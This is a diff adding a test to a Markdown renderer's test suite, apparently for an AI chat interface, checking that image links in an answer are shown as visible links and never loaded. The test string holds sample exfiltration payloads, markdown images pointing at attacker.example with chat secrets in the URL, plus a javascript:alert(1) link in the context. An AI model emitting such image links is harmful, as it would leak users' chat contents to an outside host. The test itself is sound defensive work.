@@ -20,6 +20,23 @@ describe('Markdown', () => {
     expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
   });
 
+  it('never loads an image from an address in the answer (a hostile text could smuggle chat content out in the URL)', () => {
+    const hostile = 'Summary done. ![](https://attacker.example/pixel?q=the-secret-from-the-chat) ![chart](https://cdn.example/c.png) ![ref][r]\n\n[r]: https://attacker.example/ref?q=secret';
+    const { container } = render(<Markdown text={hostile} />);
+    // no <img> at all, so the browser makes no request when the answer is displayed
+    expect(container.querySelector('img')).toBeNull();
+    // the text is kept as a LINK the user can choose to open: it is shown, not silently dropped
+    const link = [...container.querySelectorAll('a')].find((a) => a.getAttribute('href') === 'https://cdn.example/c.png')!;
+    expect(link).toBeTruthy();
+    expect(link).toHaveTextContent('chart');
+    expect(link).toHaveAttribute('target', '_blank');
+    expect(link.getAttribute('rel')).toContain('noreferrer');
+    // an image without alt text still shows where it points, so a hidden address is never invisible
+    const bare = [...container.querySelectorAll('a')].find((a) => a.getAttribute('href')?.startsWith('https://attacker.example/pixel'))!;
+    expect(bare).toBeTruthy();
+    expect(bare.textContent).toContain('attacker.example');
+  });
+
   it('opens links in a new tab without leaking the opener, and drops javascript: links', () => {
     const { container } = render(<Markdown text={'[docs](https://example.com/a) and [bad](javascript:alert(1))'} />);
     const links = [...container.querySelectorAll('a')];
